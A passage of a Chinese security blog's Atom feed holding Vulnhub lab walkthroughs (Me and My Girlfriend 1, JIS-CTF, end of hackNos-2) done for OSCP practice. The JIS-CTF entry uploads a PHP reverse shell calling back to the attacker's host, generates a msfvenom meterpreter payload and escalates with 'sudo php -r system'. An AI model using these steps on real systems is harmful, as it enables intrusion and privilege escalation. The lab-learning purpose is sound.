class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><br/><p>搜索 <code>SUID</code> 的时候，出现的 <code>sudo</code> 和 <code>passwd</code> 可以配合修改 <code>root</code> 的密码</p><p>因为 <code>flag</code> 用户不在 <code>sudoers</code> 中，无法提权，但是 <code>rohit</code> 在。</p><br/><p>这里就是为了记一下， <code>sudo</code> 和 <code>passwd</code> 同时有 <code>SUID</code> 权限，且用户位于 <code>/etc/sudoers</code> 中的时候，可以修改 <code>root</code> 密码</p>]]></content>
    
    <summary type="html">
    
      hackNos-2
    
    </summary>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/categories/vulnhub/"/>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/tags/vulnhub/"/>
    
      <category term="OSCP" scheme="https://mr-potatoz.github.io/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub靶机——Me and My Girlfirend1</title>
    <link href="https://mr-potatoz.github.io/2020/03/03/Me-and-My-Girlfirend1/"/>
    <id>https://mr-potatoz.github.io/2020/03/03/Me-and-My-Girlfirend1/</id>
    <published>2020-03-03T11:59:45.000Z</published>
    <updated>2020-03-03T12:09:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020-02-10-22</p></blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!</span><br><span class="line"></span><br><span class="line">Difficulty Level: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there are 2 flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line">From : https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;me-and-my-girlfriend-1,409&#x2F;</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br><span class="line"></span><br><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br><p>显示主机存活扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br><p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p><br><p>排除本机与网关后，找出目标机，扫服务/端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure><br><p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure><br><p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p><br><p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p><br><p><img src="2020-02-10%2018-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p><p><img src="2020-02-10%2020-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><hr><p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p><br><p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p><p>在 Burp 上有更方便的操作方式，后来改之</p><br><hr><br><p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p><br><p>既然是 Web 那便开始扫目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2018-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2018-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>得到地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure><p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   <span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure><p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure><br><p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2021-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p><p>看源代码，除密码为明文，无其他有价值信息。</p><br><p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure><br><p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p><br><p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: Alice Geulis</span><br><span class="line">username: alice</span><br><span class="line">passwd: 4lic3</span><br></pre></td></tr></table></figure><br><br><p><img src="2020-02-10%2021-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2019-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag 1 : gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2019-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br><p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure><p>得到 FLAG2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thanks! Flag 2: gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2022-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2020-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2020-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p>]]></content>
    
    <summary type="html">
    
      Me and My Girlfirend1
    
    </summary>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/categories/vulnhub/"/>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/tags/vulnhub/"/>
    
      <category term="OSCP" scheme="https://mr-potatoz.github.io/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub靶机——JIS-CTF</title>
    <link href="https://mr-potatoz.github.io/2020/03/03/JIS-CTF/"/>
    <id>https://mr-potatoz.github.io/2020/03/03/JIS-CTF/</id>
    <published>2020-03-03T11:31:17.000Z</published>
    <updated>2020-03-03T11:54:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020-02-10-15</p></blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VM Name: JIS-CTF : VulnUpload</span><br><span class="line"></span><br><span class="line">Difficulty: Beginner</span><br><span class="line"></span><br><span class="line">Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags.</span><br><span class="line"></span><br><span class="line">Only working with VirtualBox </span><br><span class="line"></span><br><span class="line">Url : https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;jis-ctf-vulnupload,228&#x2F;</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br><p>扫描主机存活获取目标地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2013-50-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>排除本机与网关还有两个，扫服务确定目标 IP ： <code>192.168.56.110</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.110</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 10:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.110</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">MAC Address: 08:00:27:C2:CD:2E (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.15 seconds</span><br></pre></td></tr></table></figure><br><p>浏览器访问如下：</p><br><p><img src="2020-02-10%2013-55-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>网站的话，需要先收集一下目录信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.110 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2009-31-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://192.168.56.110</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.110</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2009-32-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="2020-02-10%2009-33-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-1581314672000.png" alt=""> </p><br><p><code>robots</code> 总会有些东西泄露：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin_area<span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /r00t<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /uploads      <span class="comment"># ----- Not Found 404</span></span><br><span class="line">Disallow: /uploaded_files <span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /flag <span class="comment"># ----- OK 200</span></span><br></pre></td></tr></table></figure><p>逐一访问后得到可用目录如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110/index.php<span class="comment"># 主页</span></span><br><span class="line">http://192.168.56.110/flag/<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/assets<span class="comment"># 引用资源页面，包含图片（疑似有内容，先搁置）</span></span><br><span class="line">http://192.168.56.110/admin_area/<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/robots.txt<span class="comment"># robots</span></span><br><span class="line">http://192.168.56.110/uploaded_files<span class="comment"># 疑似与文件上传有关</span></span><br></pre></td></tr></table></figure><br><p>访问 <code>/flag</code> 得到 第一个 Flag ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure><br><p>访问 <code>uploaded_files</code> 空白页，但返回 <code>200 OK</code> 。无源代码</p><br><p>访问 <code>admin_area</code> ，源代码内发现第二个 Flag 及一组用户名密码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--username : admin</span></span><br><span class="line"><span class="comment">password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="comment">The 2nd flag is : &#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="打开大门"><a href="#打开大门" class="headerlink" title="打开大门"></a>打开大门</h2><br><p>使用得到的用户名密码登录 SSH 无效，但成功登录 Web 页面，一个文件上传服务：</p><br><p><img src="2020-02-10%2009-36-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>上传照片返回成功，上传 <code>php</code> 页面也成功，可知并没有黑白名单</p><p>可以上传一句话木马 + Nc 或用 <code>msfvenom</code> 生成 MSF 的 php 反弹木马</p><br><p><strong>使用 kali 上的木马</strong>  （<code>/usr/share/webshell</code>）</p><br><ul><li><code>cp /usr/share/webshell/php/php-reverse-shell.php ~/Desktop/php-shell.php</code> </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ip = <span class="string">'192.168.56.109'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">8848</span>;       <span class="comment">// CHANGE THIS</span></span><br></pre></td></tr></table></figure><br><p>监听端口。访问：<code>http://192.168.56.110/uploaded_files/php-shell.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8848</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2014-50-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p><strong>使用 MSF 的 php 反弹木马</strong> </p><br><p>生成木马，并监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.109 LPORT=8848 --format raw --out /root/桌面/msf_php.php</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2010-42-35%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2010-48-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>查看 Web的根目录，从 <code>hint.txt</code> 找到了第三个 FLAG，并说明了使用 <code>technawi</code>  的用户才可以读取 <code>flag.txt</code> 且在一个隐藏目录里面</p><br><p><img src="2020-02-10%2010-51-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2011-01-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>查看 <code>/etc/passwd</code> 除了 <code>technawi</code> 的 HOME 目录，无其他有用信息</p><br><p>那就搜索文件中包含 <code>technawi</code> 关键字的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user <span class="string">"technawi"</span> -<span class="built_in">type</span> f ! -path <span class="string">"/proc/*"</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -ri --exclude-dir=proc/ <span class="string">'technawi'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2011-15-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>发现了一个 MySQL 的 认证TXT，找到第四个 FLAG 附带一组账号密码，成功登录 SSH，并拿到最后一个 FLAG</p><br><p><img src="2020-02-10%2011-16-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2011-31-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><h2 id="提权-额外"><a href="#提权-额外" class="headerlink" title="提权(额外)"></a>提权(额外)</h2><br><p>其中，<code>technawi</code> HOME 目录下有个名为 <code>.sudo_as_admin_successful</code> 的文件，</p><p>意味着 <code>technawi</code> 可以用自己的密码登录成为 root 用户（提权）</p><br><p><img src="2020-02-10%2011-34-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><hr><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110/robots.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /admin_area</span><br><span class="line">Disallow: /r00t</span><br><span class="line">Disallow: /uploads      ----- Not Found 404</span><br><span class="line">Disallow: /uploaded_files ----- OK 200</span><br><span class="line">Disallow: /flag </span><br><span class="line">================</span><br><span class="line">http://192.168.56.110/admin_area/</span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">&lt;!--username : admin</span><br><span class="line">password : 3v1l_H@ck3r</span><br><span class="line">The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/assets/img/</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">[IMG]background_tile_1.jpg2017-04-19 10:43 2.3K </span><br><span class="line">[IMG]background_tile_2.jpg2017-04-19 10:43 2.4K </span><br><span class="line">[IMG]background_tile_3.jpg2017-04-19 10:43 2.3K </span><br><span class="line">[IMG]blue_line.jpg2017-04-19 10:43 1.3K </span><br><span class="line">[IMG]done.png2017-04-19 10:43 3.3K </span><br><span class="line">[IMG]logo.jpg2017-04-19 10:43 11K </span><br><span class="line">[IMG]tzine.png2017-04-19 10:43 1.2K </span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/flag/</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/server-status</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">注意 Cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">http://192.168.56.110/index.php</span><br><span class="line"></span><br><span class="line">登录后：</span><br><span class="line"></span><br><span class="line">Powered by : Technawi[dot]net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">meterpreter &gt; cat hint.txt</span><br><span class="line">try to find user technawi password to <span class="built_in">read</span> the flag.txt file, you can find it <span class="keyword">in</span> a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">cat /etc/mysql/conf.d/credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">technawi@Jordaninfosec-CTF01:~$ cat /var/www/html/flag.txt </span><br><span class="line">The 5th flag is : &#123;5473215946785213456975249&#125;</span><br><span class="line"></span><br><span class="line">Good job :)</span><br><span class="line"></span><br><span class="line">You find 5 flags and got their points and finish the first scenario....</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      JIS-CTF
    
    </summary>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/categories/vulnhub/"/>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/tags/vulnhub/"/>
    
      <category term="OSCP" scheme="https://mr-potatoz.github.io/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>Try Harder</title>
    <link href="https://mr-potatoz.github.io/2020/02/29/Test/"/>
    <id>https://mr-potatoz.github.io/2020/02/29/Test/</id>
    <published>2020-02-29T13:26:57.000Z</published>
    <updated>2020-03-01T14:05:44.000Z</updated>
    
    <content type="html"><![CDATA[<br><p>新的一年，新的挑战，新的目标，为了这个目标，Try Harder</p><br>]]></content>
    
    <summary type="html">
    
      开启新的篇章
    
    </summary>
    
    
      <category term="随笔" scheme="https://mr-potatoz.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Note" scheme="https://mr-potatoz.github.io/tags/Note/"/>
    
  </entry>
  
</feed>
